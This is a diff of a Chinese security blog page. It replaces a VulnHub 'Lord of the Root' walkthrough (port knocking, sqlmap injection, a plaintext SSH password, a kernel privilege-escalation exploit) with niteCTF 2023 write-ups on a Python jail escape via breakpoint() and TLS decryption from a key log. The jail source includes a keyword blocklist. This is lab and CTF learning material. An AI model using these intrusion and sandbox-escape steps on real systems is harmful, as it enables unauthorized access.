@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>Lord-Of-The-Root-1-0-1 |  n0rt6&#39;s blog</title>
+      <title>niteCTF-2023-MISC |  n0rt6&#39;s blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.jpg" />
@@ -59,7 +59,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-Lord-Of-The-Root-1-0-1"
+  id="post-niteCTF-2023-MISC"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -70,7 +70,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Lord-Of-The-Root-1-0-1
+  niteCTF-2023-MISC
 </h1>
  
 
@@ -78,11 +78,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/09/11/Lord-Of-The-Root-1-0-1/" class="article-date">
-  <time datetime="2023-09-10T16:03:02.000Z" itemprop="datePublished">2023-09-11</time>
+      <a href="/2023/12/21/niteCTF-2023-MISC/" class="article-date">
+  <time datetime="2023-12-20T16:56:08.000Z" itemprop="datePublished">2023-12-21</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+    <a class="article-category-link" href="/categories/%E8%B5%9B%E4%BA%8BWP/">赛事WP</a>
   </div>
   
 <div class="word_count">
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">731</span>
+            <span class="post-count">299</span>
         </span>
     </span>
 
@@ -99,7 +99,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2 分钟</span>
+            <span class="post-count">1 分钟</span>
         </span>
     </span>
 </div>
@@ -116,52 +116,67 @@
        
   <meta name="referrer" content="no-referrer"/>
 
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1、靶机下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova</a> 2、涉及知识点： &gt;1、端口碰撞 &gt;2、内核提权（Ubuntu14.04版本） &gt;3、UDF提权</p>
-<h2 id="靶机知识点记录"><a href="#靶机知识点记录" class="headerlink" title="靶机知识点记录"></a>靶机知识点记录</h2><p>使用nmap探测之后发现靶机只开放了22（ssh）端口？？什么玩意儿。。。 在尝试ssh登录时发现一部分内容： <img src="https://img-blog.csdnimg.cn/090fe71b8b45414dbf63b1f3f996bf28.png" alt="45"> 看到了easy as 1，2，3。 以前也没遇到过，再查看别人的打靶记录之后发现原来是关于<strong>端口碰撞（Port Knocking）技术</strong>的知识点。</p>
+<h2 id="blindjail"><a href="#blindjail" class="headerlink" title="blindjail"></a>blindjail</h2><p>nc连接题目，也没有源码<br><img src="https://img-blog.csdnimg.cn/direct/965af19a6dbf4a0eaa03b21e89043b44.png" alt="123"><br>看起来像是python终端，要进行命令执行时发现import被禁了<br>在这里了解到python中的一个函数<strong>breakpoint()</strong><br><img src="https://img-blog.csdnimg.cn/direct/c3de4eefccdd4c1f9af07b920b7b4f41.png" alt="12"><br>那么这里就使用这个函数尝试一下<br><img src="https://img-blog.csdnimg.cn/direct/ee933b91579b454590e5e63f8cd88dba.png" alt="456"><br>当然还可以使用全角字符绕过<br><img src="https://img-blog.csdnimg.cn/direct/c6cc0ea01d334648b1f6e1eeeef9801b.png" alt="132"></p>
+<p>趁机偷一下源码😁</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># main.py</span>
+<span class="token comment"># print(getattr("".__class__.___mro___.__subclasses__()[108])().load_module("\x6f\x73"),"")</span>
+<span class="token comment"># subclasses = "".__class__.__mro__[1].__subclasses__()</span>
+<span class="token comment"># print("Subclasses:", subclasses)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">checker</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># a = inp  # f'flag'+ inp</span>
+    <span class="token comment"># print(a)</span>
+    <span class="token comment"># redact the keyword lists</span>
+
+    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> <span class="token punctuation">[</span>
+        <span class="token string">"eval"</span><span class="token punctuation">,</span>
+        <span class="token string">"exec"</span><span class="token punctuation">,</span>
+        <span class="token string">"import"</span><span class="token punctuation">,</span>
+        <span class="token string">"open"</span><span class="token punctuation">,</span>
+        <span class="token string">"os"</span><span class="token punctuation">,</span>
+        <span class="token string">"read"</span><span class="token punctuation">,</span>
+        <span class="token string">"system"</span><span class="token punctuation">,</span>
+        <span class="token string">"write"</span><span class="token punctuation">,</span>
+        <span class="token string">"subprocess"</span><span class="token punctuation">,</span>
+        <span class="token string">"str"</span><span class="token punctuation">,</span>
+        <span class="token string">"flag"</span><span class="token punctuation">,</span>
+        <span class="token string">"import"</span><span class="token punctuation">,</span>
+        <span class="token string">"cat"</span><span class="token punctuation">,</span>
+        <span class="token string">"63"</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> inp<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f" Nope,  </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">  is banned! "</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        o <span class="token operator">=</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> o <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>
+
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>
+    <span class="token string">"------------------------------------------------------------- \n WELCOME TO THE BLINDJAIL \n --------------------------------------------------------\n "</span>
+    <span class="token string">"\x1B[3m fret not that you cannot see, fret that you cannot leave.\x1B[0m "</span>
+<span class="token punctuation">)</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> inp<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+        checker<span class="token punctuation">(</span>inp<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"look for the light! \n"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="DecryptaQuest"><a href="#DecryptaQuest" class="headerlink" title="DecryptaQuest"></a>DecryptaQuest</h2><p>给了一个流量包<a target="_blank" rel="noopener" href="https://github.com/daffainfo/ctf-writeup/blob/main/niteCTF%202023/DecryptaQuest/Decryta_logs.pcapng">Decryta_logs.pcapng</a><br>存在一些未解密的tls流量包，打开之后经过一番查找找到一段base64密文，使用cyber解码一下<br><img src="https://img-blog.csdnimg.cn/direct/0af975aab3d548998d6ee631e4854276.png" alt="123"><br>通过一下内容看出是SSLKEYLOGFILE</p>
 <blockquote>
-<p>端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。如果收到正确的连接请求序列，防火墙规则就会被动态更改，从而允许连接请求的主机通过特定端口进行连接。如果不是按照特定的端口序列进行请求，那么受保护的端口就会关闭。</p>
+<p>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_TRAFFIC_SECRET_0<br>SERVER_TRAFFIC_SECRET_0<br>EXPORTER_SECRET<br><img src="https://img-blog.csdnimg.cn/direct/b24592424660498e96c923ee6ab0120e.png" alt="456"></p>
 </blockquote>
-<p>靶机这个意思应该就是要按照端口1、2、3的序列进行连接尝试。之后打开受保护的端口。 <strong>端口碰撞方法</strong></p>
-<ul>
-<li>1 knock命令</li>
-</ul>
-<blockquote>
-<p>konck 192.168.206.144 1 2 3 -v</p>
-</blockquote>
-<ul>
-<li>2 nmap命令</li>
-</ul>
-<blockquote>
-<p>按次序进行指定端口扫描即可</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/7130abec22004654add004cd8a88ed15.png" alt="2"></p>
-<p>之后再使用nmap探测。 后面在找到登录页面之后尝试进行sql注入。 普通的方式进行SQLmap注入扫描没找到，使用sqllmap进行针对表单的注入:</p>
-<blockquote>
-<p>sqlmap -o -u <a target="_blank" rel="noopener" href="http://192.168.206.144:1337/978345210/index.php">http://192.168.206.144:1337/978345210/index.php</a> –forms –dbs</p>
-</blockquote>
-<p>在拿到账号密码之后使用ssh登录靶机</p>
-<blockquote>
-<p>ssh <a href="mailto:&#x73;&#x6d;&#x65;&#x61;&#103;&#x6f;&#108;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x32;&#x30;&#x36;&#x2e;&#x31;&#52;&#52;">&#x73;&#x6d;&#x65;&#x61;&#103;&#x6f;&#108;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x32;&#x30;&#x36;&#x2e;&#x31;&#52;&#52;</a> MyPreciousR00t</p>
-</blockquote>
-<p>登录之后当然要开始收集信息进行提权了，查看系统版本</p>
-<blockquote>
-<p>uname -a Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p>
-</blockquote>
-<p>也可以给靶机上传一个信息收集文件 本机使用python开启一个http服务</p>
-<blockquote>
-<p>python -m http.server</p>
-</blockquote>
-<p>靶机下载文件</p>
-<blockquote>
-<p>wget <a target="_blank" rel="noopener" href="http://192.168.206.1:8000/linux-exploit-suggester.sh">http://192.168.206.1:8000/linux-exploit-suggester.sh</a> chmod 777 linux-exploit-suggester.sh .&#x2F;linux-exploit-suggester.sh</p>
-</blockquote>
-<p>收集一波之后发现可以使用脏牛提权，但是试了几次都把靶机搞坏了，换一种方法吧。 我使用的多的信息收集工具是<strong>linpeas.sh</strong>。 好了先使用内核提权搜索Ubuntu14.04版本提权漏洞 找到一个<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39166">CVE-2015-8660</a></p>
-<p>下载之后执行以下命令就行</p>
-<blockquote>
-<p>gcc 39166.c -o dayu chmod 777 czy .&#x2F;dayu</p>
-<p>提权成功 <img src="https://img-blog.csdnimg.cn/58e4f735e80748d499a4ac198f5ae0fb.png" alt="1"> 之前使用linpeas.sh收集信息时发现还有个地方有问题 <img src="https://img-blog.csdnimg.cn/d8c77bb96f4c484586bcd00c0c8e223e.png" alt="1"> 在root目录下发现还有一个python文件switcher.py文件，内容与3个door文件有关，这里涉及缓冲区溢出的问题，有时间再看。 然后还有一种提权方法就是<strong>UDF提权</strong> 直接用的exp：</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/a1a2a7ff0ac242e8a35747b3d27ce149.png" alt="12"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/afe378d07d7f4d5692ff45e0e646402c.png" alt="456"><br>现在将SSLKEYLOGFILE导出保存然后再导入到wireshark中<br>编辑-&gt;首选项-&gt;Protocols-&gt;TLS<br><img src="https://img-blog.csdnimg.cn/direct/c20137bdfbd64513bdda2b913e922398.png" alt="123"><br>然后过滤http流量<br><img src="https://img-blog.csdnimg.cn/direct/a613499b2c0c48a99f2e92576ab0920d.png" alt="132"></p>
  
       <!-- reward -->
       
@@ -232,30 +247,23 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2023/09/11/Lord-Of-The-Root-1-0-1/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2023/12/21/niteCTF-2023-MISC/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
     </footer>
   </div>
 
    
   <nav class="article-nav">
     
-      <a href="/2023/10/06/NewStarCTF-2023/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            NewStarCTF-2023
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/" class="article-nav-link">
+      <a href="/2023/12/20/niteCTF-2023-Image-Gallery-wirteup/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">羊城杯2022</div>
+        <div class="article-nav-title">niteCTF-2023-Image-Gallery-wirteup</div>
       </a>
     
   </nav>
